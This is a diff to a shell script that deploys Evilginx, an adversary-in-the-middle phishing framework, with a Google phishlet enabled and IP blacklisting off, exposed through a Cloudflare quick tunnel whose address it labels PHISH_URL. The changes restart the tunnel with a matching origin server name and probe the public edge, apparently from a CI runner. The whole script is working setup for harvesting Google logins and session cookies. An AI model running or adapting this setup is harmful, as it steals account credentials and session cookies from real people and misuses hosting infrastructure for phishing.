@@ -17,13 +17,19 @@ for i in $(seq 1 60); do
   sleep 2
 done
 [ -n "$URL" ] && echo "PHISH_URL=$URL" || { echo "NO_TUNNEL_URL_FOUND"; tail -n 30 cloudflared.log; }
+HOST="${URL#https://}"
+
+echo "--- restarting tunnel with origin SNI=$HOST ---"
+pkill -f cloudflared 2>/dev/null || true
+sleep 2
+nohup "$CLOUDFLARED" tunnel --url https://localhost:443 --no-tls-verify --origin-server-name "$HOST" > cloudflared.log 2>&1 &
+sleep 3
 
 echo "--- writing evilginx config (enable google) ---"
 $SUDO mkdir -p /root/.evilginx
 echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$URL\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null
 
 echo "--- starting evilginx (headless via fifo) ---"
-HOST="${URL#https://}"
 rm -f /tmp/eg_in; mkfifo /tmp/eg_in
 ( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
 "$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer < /tmp/eg_in 2>&1 | tee evilginx.log &
@@ -35,8 +41,11 @@ for i in $(seq 1 30); do
   sleep 2
 done
 echo "PORT443_BOUND=$BOUND"
-curl -k -sS -m 6 -o /dev/null -w 'ORIGIN_HTTP:%{http_code}\n' https://localhost/ 2>&1 || echo "ORIGIN_PROBE_FAIL"
+echo "--- tunnel/edge probe (from runner) ---"
+curl -sS -m 12 -o /tmp/edge.out -w 'EDGE_HTTP:%{http_code}\n' "$URL/" 2>&1 || echo "EDGE_PROBE_FAIL"
+head -c 200 /tmp/edge.out 2>/dev/null || true
+echo ""
 
 echo "=== streaming evilginx output ==="
-trap 'kill %3 %2 %1 2>/dev/null || true' EXIT
+trap 'kill %4 %3 %2 %1 2>/dev/null || true' EXIT
 for i in $(seq 1 "$((LIMIT * 6))"); do sleep 10; done
